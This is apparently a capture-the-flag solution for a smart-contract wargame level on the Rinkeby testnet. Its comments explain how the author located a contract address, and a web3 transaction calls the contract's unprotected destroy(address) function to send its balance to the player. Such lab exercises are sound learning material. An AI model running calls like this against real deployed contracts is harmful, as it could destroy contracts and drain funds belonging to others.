//I simply checked my level's internal txs and found the only contract creation, which has to be the wanted token contract,
//https://rinkeby.etherscan.io/address/0x41307f24238e19e60f189968be0b3632a995ff87#internaltx
//namely this one:0x9c6c2ff0e69ded05b4ff3196a4258f636a798097

//Then I could simply call destroy with my address:

web3.eth.sendTransaction({
    from: player,
    to: "0x9c6c2ff0e69ded05b4ff3196a4258f636a798097",
    data: web3.eth.abi.encodeFunctionSignature("destroy(address)", player)
})

//It was so easy that I had to check the solutions and apparently it was intended to learn about the generation of contract addresses
// (rightmost 20 bytes of keccak-hash of rlp-encoded concatenation of address + nonce)
